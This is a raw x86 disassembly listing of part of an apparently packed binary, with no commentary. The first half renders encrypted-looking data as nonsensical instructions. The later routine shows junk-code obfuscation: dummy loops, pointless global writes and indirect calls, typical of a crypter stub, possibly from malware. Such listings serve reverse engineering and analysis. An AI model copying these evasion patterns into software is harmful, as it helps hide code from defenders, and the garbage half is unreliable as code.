  408c6c:	or     ch,BYTE PTR [ebx-0x7e72952e]
  408c72:	push   esp
  408c73:	ja     0x408c71
  408c75:	into   
  408c76:	dec    esi
  408c77:	mov    eax,ecx
  408c79:	(bad)  
  408c7a:	(bad)  
  408c7b:	jmp    0x155f83c8
  408c80:	or     eax,0x5649ea8b
  408c85:	mov    al,ds:0xb6813818
  408c8a:	je     0x408c49
  408c8c:	inc    esp
  408c8d:	aad    0x2d
  408c8f:	test   DWORD PTR ds:0xcb744eca,ebp
  408c95:	sahf   
  408c96:	popa   
  408c97:	dec    ebx
  408c98:	js     0x408d07
  408c9a:	xchg   ebx,eax
  408c9b:	(bad)  
  408c9d:	rcr    ch,0xa3
  408ca0:	outs   dx,DWORD PTR ds:[esi]
  408ca1:	and    al,0xf0
  408ca3:	cmp    al,0x9c
  408ca5:	test   eax,0xfe72bce2
  408cab:	das    
  408cac:	retf   0x75c9
  408caf:	lods   al,BYTE PTR ds:[esi]
  408cb0:	es or  al,0xbe
  408cb3:	push   cs
  408cb4:	push   ds
  408cb5:	and    al,0x78
  408cb7:	xor    eax,0xd102f10
  408cbc:	sbb    al,dl
  408cbe:	in     eax,dx
  408cbf:	aaa    
  408cc0:	sub    eax,0x5185c995
  408cc5:	or     esi,DWORD PTR [edi-0x66]
  408cc8:	out    0x10,al
  408cca:	repz repz lock loop 0x408d41
  408ccf:	or     BYTE PTR [edi+ebx*2-0x1fba49f],0x1f
  408cd7:	div    DWORD PTR ds:0xf31da244
  408cdd:	jae    0x408c60
  408cdf:	xchg   edi,eax
  408ce0:	rcl    bl,0x5a
  408ce3:	pop    es
  408ce4:	sar    BYTE PTR [ecx-0xcf27e71],cl
  408cea:	in     eax,dx
  408ceb:	jl     0x408cf4
  408ced:	jns    0x408cb9
  408cef:	cmp    DWORD PTR [ebp-0x31],ecx
  408cf2:	cmp    DWORD PTR [eax-0x7f],ebp
  408cf5:	pop    ebx
  408cf6:	or     al,0x60
  408cf8:	xor    al,BYTE PTR ds:0x5a1176d0
  408cfe:	stc    
  408cff:	scas   eax,DWORD PTR es:[edi]
  408d00:	stc    
  408d01:	fs xchg edx,eax
  408d03:	ret    
  408d04:	mov    ah,0x83
  408d06:	and    eax,DWORD PTR [ecx]
  408d08:	out    0x94,eax
  408d0a:	inc    eax
  408d0b:	sahf   
  408d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d0d:	ds cs inc edi
  408d10:	data16 shl BYTE PTR [ecx+0x3b],0x10
  408d15:	xchg   ebp,eax
  408d16:	xchg   ecx,eax
  408d17:	xor    ebx,ecx
  408d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d1a:	ds in  al,dx
  408d1c:	push   ebp
  408d1d:	mov    ebp,0x3f6bef5
  408d22:	mov    BYTE PTR [edx+ebp*4-0x1c],bl
  408d26:	sahf   
  408d27:	xchg   esi,eax
  408d28:	(bad)  
  408d29:	call   0xac99cd69
  408d2e:	mov    al,ds:0x1eeaca96
  408d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d34:	fsub   DWORD PTR [esi+0x64]
  408d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d38:	mov    cl,0x25
  408d3a:	jg     0x408d4c
  408d3c:	popa   
  408d3d:	into   
  408d3e:	xor    ebp,DWORD PTR [edi+0x2c]
  408d41:	ins    DWORD PTR es:[edi],dx
  408d42:	push   ecx
  408d43:	push   edx
  408d44:	data16 test al,0x7d
  408d47:	addr16 mov bh,0xc0
  408d4a:	pushf  
  408d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d4c:	addr16 push ds
  408d4e:	add    al,ah
  408d50:	adc    dh,BYTE PTR [esi-0x24f12f92]
  408d56:	outs   dx,DWORD PTR ds:[esi]
  408d57:	dec    esp
  408d58:	jbe    0x408d06
  408d5a:	sub    eax,0xd1e6fc3f
  408d5f:	shr    ebx,1
  408d61:	ret    0xb12
  408d64:	add    ecx,DWORD PTR [esi-0x1e497fc9]
  408d6a:	xchg   esp,eax
  408d6b:	dec    edi
  408d6c:	mov    dl,0x20
  408d6e:	test   DWORD PTR [edx],edx
  408d70:	add    edi,DWORD PTR ds:0xe86f853f
  408d76:	push   eax
  408d77:	rol    BYTE PTR [ebx],1
  408d79:	xlat   BYTE PTR ds:[ebx]
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	add    eax,0xb17d5c5d
  408daf:	sar    DWORD PTR [esi+0x7e],1
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408d89
  408db7:	stc    
  408db8:	xor    ah,0x77
  408dbb:	add    esp,eax
  408dbd:	dec    edx
  408dbe:	call   0x36a9fbbc
  408dc3:	cli    
  408dc4:	push   ebx
  408dc5:	fistp  DWORD PTR [eax]
  408dc7:	pop    ds
  408dc8:	push   es
  408dc9:	iret   
  408dca:	mov    WORD PTR [edx],?
  408dcc:	mov    ebx,0xb6a57748
  408dd1:	adc    edx,DWORD PTR [ecx-0xa44b183]
  408dd7:	sub    bh,al
  408dd9:	in     eax,dx
  408dda:	retf   
  408ddb:	rcr    BYTE PTR [edx-0x47f12b1b],cl
  408de1:	bound  edi,QWORD PTR [eax+0x50]
  408de4:	pop    es
  408de5:	dec    ebp
  408de6:	jae    0x408dd6
  408de8:	mov    esi,DWORD PTR [edx+eiz*2-0x63241a10]
  408def:	mov    edi,0x17e0828d
  408df4:	xchg   BYTE PTR [ebp-0xb],ah
  408df7:	and    eax,0x4b17bece
  408dfc:	mov    DWORD PTR [eax+0x2914a3ee],ebx
  408e02:	test   eax,0x1680aa2c
  408e07:	sbb    al,0xb8
  408e09:	jmp    0x408e12
  408e0b:	cmp    BYTE PTR [edx],0x54
  408e0e:	inc    ebp
  408e0f:	adc    ch,BYTE PTR [ebx]
  408e11:	jg     0x408e1e
  408e13:	sbb    BYTE PTR [edi],bl
  408e15:	jmp    0x408e90
  408e17:	mov    ds:0xab916be4,eax
  408e1c:	pop    gs
  408e1e:	push   esp
  408e1f:	adc    DWORD PTR [edi-0x1c211b51],0xa19ad96a
  408e29:	fmul   DWORD PTR [eax-0x7feb49f2]
  408e2f:	popa   
  408e30:	dec    edx
  408e31:	out    dx,al
  408e32:	xor    eax,0xfea67be4
  408e37:	pop    ds
  408e38:	sbb    al,ah
  408e3a:	push   edi
  408e3b:	inc    ecx
  408e3c:	pop    ds
  408e3d:	dec    edx
  408e3e:	es lahf 
  408e40:	push   DWORD PTR [edx+0x62ebb586]
  408e46:	sbb    eax,0xc1cc276b
  408e4b:	fld    TBYTE PTR [esi-0x1d]
  408e4e:	sbb    eax,0x2be921ec
  408e53:	fild   QWORD PTR [esi+0x3c]
  408e56:	or     esp,DWORD PTR [edx+0x7e9cd22b]
  408e5c:	and    al,BYTE PTR [ecx]
  408e5e:	mov    dh,BYTE PTR [ebp-0x3626b81a]
  408e64:	(bad)  
  408e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e66:	int    0x34
  408e68:	hlt    
  408e69:	mov    esp,0xe14e5f93
  408e6e:	adc    BYTE PTR ss:[edx-0x1170d2e9],dl
  408e75:	ror    eax,0x56
  408e78:	ins    DWORD PTR es:[edi],dx
  408e79:	mov    ds:0xc8078450,al
  408e7e:	sub    DWORD PTR [eax],ebx
  408e80:	mov    al,ds:0x2fa8a63c
  408e85:	fwait
  408e86:	push   eax
  408e87:	or     ebp,DWORD PTR [ecx+0x3830384]
  408e8d:	inc    DWORD PTR [ebx+0xd334002]
  408e93:	pop    esi
  408e94:	jne    0x408eb5
  408e96:	jbe    0x408ef3
  408e98:	ins    DWORD PTR es:[edi],dx
  408e99:	cmp    eax,0x720b3c18
  408e9e:	mov    ecx,0xd8785d97
  408ea3:	and    edx,DWORD PTR [edx-0x52e93c53]
  408ea9:	mov    eax,ds:0x848c9b84
  408eae:	fs call 0x5a6cfd2e
  408eb4:	push   ebx
  408eb5:	nop
  408eb6:	pop    edx
  408eb7:	rcl    BYTE PTR [ecx-0x4cf87091],1
  408ebd:	pop    ds
  408ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ec0:	jmp    DWORD PTR [ebx]
  408ec2:	inc    esi
  408ec3:	sbb    eax,0x586d63ec
  408ec8:	cmp    BYTE PTR [edi-0x36],bh
  408ecb:	popf   
  408ecc:	fucomi st,st(7)
  408ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ecf:	outs   dx,DWORD PTR ds:[esi]
  408ed0:	lea    esi,[edx]
  408ed2:	add    ebx,ecx
  408ed4:	inc    ebp
  408ed5:	sti    
  408ed6:	adc    al,0xbd
  408ed8:	inc    ecx
  408ed9:	jbe    0x408eb0
  408edb:	data16 mov fs,WORD PTR ds:0x66bf9147
  408ee2:	or     BYTE PTR [edi],ah
  408ee4:	cmp    eax,DWORD PTR [edi-0x3f57804]
  408eea:	loope  0x408f0a
  408eec:	or     al,0xfb
  408eee:	cmp    al,0xde
  408ef0:	and    DWORD PTR [ebx-0x54],0x379f861d
  408ef7:	xchg   esi,eax
  408ef8:	out    0x4e,eax
  408efa:	pop    DWORD PTR [ebx]
  408efc:	cmp    edi,DWORD PTR [eax]
  408efe:	in     al,0x2b
  408f00:	stos   BYTE PTR es:[edi],al
  408f01:	aad    0xf9
  408f03:	add    ebx,DWORD PTR [esi-0x5c6729c4]
  408f09:	out    0x2f,al
  408f0b:	outs   dx,DWORD PTR ds:[esi]
  408f0c:	pop    eax
  408f0d:	or     al,0xdd
  408f0f:	xchg   esi,eax
  408f10:	or     al,0xea
  408f12:	scas   al,BYTE PTR es:[edi]
  408f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f14:	sbb    eax,0x6c6ede34
  408f19:	(bad)  
  408f1a:	mov    eax,0x9457fda6
  408f1f:	ja     0x408f1d
  408f21:	cmp    dh,ah
  408f23:	jmp    0x408f33
  408f25:	or     ah,ah
  408f27:	test   DWORD PTR [ebp-0x76],esi
  408f2a:	push   ecx
  408f2b:	retf   0x211e
  408f2e:	aaa    
  408f2f:	lods   eax,DWORD PTR ds:[esi]
  408f30:	push   edx
  408f31:	cwde   
  408f32:	retf   0x2987
  408f35:	cmp    BYTE PTR [ebp+0x5610063],0x14
  408f3c:	sahf   
  408f3d:	xchg   DWORD PTR [edi-0x4d],esp
  408f40:	push   eax
  408f41:	fwait
  408f42:	inc    ecx
  408f43:	jae    0x408f10
  408f45:	cmp    cl,BYTE PTR [ebp-0x7423c34e]
  408f4b:	pop    ebp
  408f4c:	clc    
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	dec    eax
  408f61:	pop    esi
  408f62:	cmp    al,0xba
  408f64:	int    0xdf
  408f66:	jle    0x408fe6
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408f75
  408f6d:	mov    cl,0x90
  408f6f:	dec    esp
  408f70:	ds mov bh,0xa1
  408f73:	outs   dx,DWORD PTR ds:[esi]
  408f74:	sbb    ah,dl
  408f76:	cmp    ah,BYTE PTR [eax]
  408f78:	stc    
  408f79:	mov    ebx,0x3798b886
  408f7e:	cmp    esi,DWORD PTR [edi]
  408f80:	sbb    BYTE PTR [edi],dl
  408f82:	imul   BYTE PTR [edi]
  408f84:	jge    0x408f18
  408f86:	in     eax,0xa1
  408f88:	push   0xffffffad
  408f8a:	nop
  408f8b:	xlat   BYTE PTR ds:[ebx]
  408f8c:	stos   BYTE PTR es:[edi],al
  408f8d:	icebp  
  408f8e:	xchg   ecx,eax
  408f8f:	inc    ebx
  408f90:	int    0x4b
  408f92:	dec    eax
  408f93:	sub    eax,0xa3f3ebd2
  408f98:	sbb    bl,BYTE PTR [ecx]
  408f9a:	pop    esp
  408f9b:	push   edx
  408f9c:	add    eax,0xc47090b2
  408fa1:	mov    ebx,0xf643450
  408fa6:	or     BYTE PTR [edx],bh
  408fa8:	daa    
  408fa9:	mov    esi,0x19060694
  408fae:	ds nop
  408fb0:	mov    DWORD PTR [edx-0x598e33ca],esi
  408fb6:	outs   dx,DWORD PTR ds:[esi]
  408fb7:	(bad)  
  408fb8:	push   0xd83b0a35
  408fbd:	push   esi
  408fbe:	mov    dh,BYTE PTR [eax]
  408fc0:	dec    esp
  408fc1:	push   es
  408fc2:	test   eax,0xf8114f80
  408fc7:	jno    0x408fc1
  408fc9:	iret   
  408fca:	in     eax,0xb7
  408fcc:	std    
  408fcd:	mov    al,0xd
  408fcf:	xlat   BYTE PTR ds:[ebx]
  408fd0:	aam    0xb8
  408fd2:	and    al,0xe7
  408fd4:	pop    eax
  408fd5:	adc    edx,esp
  408fd7:	ss cmp al,0x1d
  408fda:	jmp    0x408fae
  408fdc:	adc    eax,0x3766bea1
  408fe1:	sbb    bl,BYTE PTR [eax]
  408fe3:	xor    edi,ecx
  408fe5:	int    0x75
  408fe7:	test   eax,0x2da51b32
  408fec:	and    DWORD PTR [edx+0x6673b764],ecx
  408ff2:	push   esi
  408ff3:	aaa    
  408ff4:	retf   0x52fc
  408ff7:	hlt    
  408ff8:	mov    dl,0x33
  408ffa:	cli    
  408ffb:	or     BYTE PTR [ebp-0x6f],bl
  408ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fff:	in     al,dx
  409000:	in     eax,0x8f
  409002:	mov    esi,ss
  409004:	adc    al,0x48
  409006:	and    DWORD PTR [ecx+0x3e007d4a],0x2c
  40900d:	mov    dl,0x4a
  40900f:	sbb    cl,BYTE PTR [eax-0x1f274a4c]
  409015:	mov    ch,0x17
  409017:	and    ecx,esp
  409019:	scas   eax,DWORD PTR es:[di]
  40901b:	cs jmp 0x3eb1855b
  409021:	mov    ah,0x4b
  409023:	push   esp
  409024:	pop    edx
  409025:	dec    eax
  409026:	or     al,ah
  409028:	mov    DWORD PTR [ecx+0x40],esi
  40902b:	mov    ecx,0x59db5953
  409030:	xchg   esi,eax
  409031:	and    eax,0xd9e62a0a
  409036:	cmp    al,0x30
  409038:	iret   
  409039:	fxch   st(4)
  40903b:	mov    ebx,0xaca6f13
  409040:	mov    es,WORD PTR ds:0x849b66ce
  409046:	sub    al,0x12
  409048:	into   
  409049:	dec    eax
  40904a:	es retf 0xfb8e
  40904e:	retf   
  40904f:	adc    eax,esi
  409051:	ja     0x40901e
  409053:	ror    BYTE PTR [ebx+0x350a923f],0x3d
  40905a:	lock je 0x4090a5
  40905d:	call   0xce81:0x472662a7
  409064:	or     eax,0xea2e7c1c
  409069:	mov    ah,0x13
  40906b:	cdq    
  40906c:	fidiv  WORD PTR [edi]
  40906e:	inc    si
  409071:	pop    edx
  409072:	daa    
  409073:	add    BYTE PTR [eax*8+0x73569d72],bl
  40907a:	xchg   esp,eax
  40907b:	adc    bh,BYTE PTR [ecx+0x25]
  40907e:	das    
  40907f:	outs   dx,BYTE PTR ds:[esi]
  409080:	jg     0x409101
  409082:	sub    al,0xa2
  409084:	cmc    
  409085:	jbe    0x4090cd
  409087:	and    DWORD PTR [edx-0x4f],ebx
  40908a:	pop    ss
  40908b:	lods   al,BYTE PTR ds:[esi]
  40908c:	sti    
  40908d:	xor    esp,DWORD PTR [edx]
  40908f:	scas   eax,DWORD PTR es:[edi]
  409090:	jnp    0x409086
  409092:	jecxz  0x4090c0
  409094:	and    DWORD PTR [edx],edi
  409096:	(bad)  
  409097:	sub    DWORD PTR fs:[edx-0x44ed177a],0xffffffe2
  40909f:	inc    esi
  4090a0:	jecxz  0x4090dc
  4090a2:	or     BYTE PTR [ebp+0x68],cl
  4090a5:	push   edi
  4090a6:	enter  0xa56,0x8c
  4090aa:	dec    DWORD PTR [edx-0x73afa3c1]
  4090b0:	mov    WORD PTR [esi],es
  4090b2:	cmp    DWORD PTR [edi+ebx*2],ecx
  4090b5:	fbld   TBYTE PTR [edi-0x12faa2d5]
  4090bb:	pop    esi
  4090bc:	mov    al,0x82
  4090be:	(bad)  
  4090bf:	setge  BYTE PTR [eax+0x428b4b5c]
  4090c6:	push   esp
  4090c7:	add    DWORD PTR [eax+0xb],eax
  4090ca:	mov    ah,0xc7
  4090cc:	daa    
  4090cd:	sbb    BYTE PTR [edx+0x3482018d],0xa4
  4090d4:	std    
  4090d5:	test   DWORD PTR [edi-0x4a1428c0],eax
  4090db:	xchg   esi,eax
  4090dc:	jmp    0x4dd3:0xe5f202d4
  4090e3:	adc    al,BYTE PTR [esi+0x2c11a57b]
  4090e9:	sub    DWORD PTR [edx+0x665965c8],ebx
  4090ef:	pop    es
  4090f0:	test   ecx,edx
  4090f2:	dec    ecx
  4090f3:	sahf   
  4090f4:	xor    eax,0x47479c04
  4090f9:	call   0xfe44555d
  4090fe:	imul   ebp,DWORD PTR [edx],0xaf0fd103
  409104:	sar    DWORD PTR [ebx],cl
  409106:	xlat   BYTE PTR ds:[ebx]
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42ea37
  40911f:	and    DWORD PTR ds:0x4304db,0x43043d
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42eddb,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x4304e3,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e7d8,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42ea77
  40916b:	sbb    DWORD PTR ds:0x430441,0x430471
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42edcb,0x624a
  409184:	call   DWORD PTR ds:0x42ea3f
  40918a:	adc    DWORD PTR ds:0x42e7c0,0x43045d
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x430451,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x430435,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x43046d,0x42e7d4
  4091c4:	call   DWORD PTR ds:0x42eae3
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e7c8
  4091d6:	and    DWORD PTR ds:0x430459,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x430439,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42eddb,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42eddb,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42eddb,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e9e3
  409219:	mov    ecx,DWORD PTR ds:0x42eddb
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42eddb,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ede3,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42eddf
  409243:	sbb    eax,DWORD PTR ds:0x42eddb
  409249:	mov    ds:0x42eddf,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42eddb
  409261:	and    DWORD PTR ds:0x42e7bc,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x430455,0x4304d7
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e7cc,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x430455,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42edcb,0x4304e7
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42edcb,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x430449,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x430459,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ede3,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e7c8,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x430435,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e9ff
  40930f:	adc    DWORD PTR ds:0x42eddf,0x42e7cc
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x430455,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x430451,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x430451
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x430451,ecx
  409352:	cmp    DWORD PTR ds:0x430451,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x430451,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e9e7
  409375:	cmp    DWORD PTR ds:0x430451,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x430451
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x430451,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42edcb
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e967
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x4304d3,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x4304eb,0x17
  4093b9:	cmp    DWORD PTR ds:0x4304eb,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x4304eb,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e9eb
  4093df:	cmp    DWORD PTR ds:0x4304eb,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x4304eb
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x4304eb,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x4304eb
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x4304eb,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x4304df,0x10
  409415:	cmp    DWORD PTR ds:0x4304df,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x4304df,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e9ef
  409438:	mov    ecx,DWORD PTR ds:0x4304df
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x4304df,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x430461
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x430469,0x16
  409461:	cmp    DWORD PTR ds:0x430469,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x430469,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e9f3
  409481:	mov    ecx,DWORD PTR ds:0x430469
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x430469,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42edcf,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42edcf
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42edcf,ecx
  4094b7:	cmp    DWORD PTR ds:0x42edcf,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42edcf,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e8fb
  4094d6:	push   0x42e8a5
  4094db:	call   DWORD PTR ds:0x42ec2b
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x430451,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x4304eb,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ede3,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x430469,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x4304e3,0x430471
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x430439,0x1e
  40953f:	cmp    DWORD PTR ds:0x430439,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x430439,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e7dc
  409566:	call   DWORD PTR ds:0x42e9f7
  40956c:	mov    eax,ds:0x430439
  409571:	dec    eax
  409572:	mov    ds:0x430439,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430489
  409582:	mov    eax,ds:0x430513
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x4304cf,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e7d8,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x430441,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x430441
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x430441,edx
  4095e8:	cmp    DWORD PTR ds:0x430441,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e8cd
  409617:	call   DWORD PTR ds:0x42e9fb
  40961d:	cmp    DWORD PTR ds:0x430441,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e7c8,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e7c8
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e7c8,ecx
  40964a:	cmp    DWORD PTR ds:0x42e7c8,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42ec2f
  409672:	cmp    DWORD PTR ds:0x42e7c8,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
